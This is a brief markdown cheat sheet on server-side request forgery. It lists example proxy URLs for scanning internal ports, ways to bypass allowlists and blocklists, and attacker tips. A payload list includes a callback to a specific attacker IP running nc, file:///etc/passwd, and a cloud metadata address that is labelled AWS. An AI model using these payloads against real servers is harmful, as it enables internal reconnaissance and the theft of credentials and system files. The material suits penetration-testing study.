# SSRF

## Types
- Blind SSRF: Allows to scan for accessible hosts and ports
  - /images/proxy?url=http://10.0.0.1/ => 80 ms
  - /images/proxy?url=http://10.0.0.1:81/ => 5014 ms
  - /images/proxy?url=http://10.0.0.1:6379/ => 94 ms
- Full response
  - Allows you to see the entire response from the server
- limited or No response: Shows a portion of the reesponse like the title of the page or No response or you have access to resources but can`t see them directly
  - /images/proxy?url=http://10.0.0.1/ => HTTP/1.1 200 OK
  - /images/proxy?url=http://10.0.0.1:87/ => HTTP/1.1 404 Not Found , 408 Request Timeout
  - /images/proxy?url=http://10.0.0.1:8080/ => HTTP/1.1 200 OK

# Potential Blockers & Solutions
- Whitelist
  - Blocker: Only allow a few domain names to be used in the request
  - Solution: Finding an Open Redirect
- Blacklisting
  - Blocker: Block access to internal IP addresses, domains or keywords
  - Solution: Creating a custom CNAME and pointing it to our internal IP address on our target
- Restricted Content-Type, extensions, characters
  - Blocker: Only allow a particular file type
  - Solution: Manual fuzzing and creating a bypass
- No response
  - Blocker: Not able to see response from the request
  - Solution: JavaScript XHR request to retrive file contents 

# Tips
- You are making a server side request
- You are browsing content that is rendering on the host machine
- There are different ways to look for content on localhost other than "localhost" or 127.0.0.1
- You may need to use an open redirect to redirect the machine to your destination host
- The current host may be able to communicate with other machines on the network (that may require being on corporate VPN)
- Make sure the request comes from the remote server and not your personal IP address

# Payload
- http://134.209.1.150:8000 (nc is running on attacker machine))
- file:///etc/passwd
- http://localhost
- http://169.254.169.254/metadata/v1 (AWS)
- Copy and paste *Burp Collaborator* address
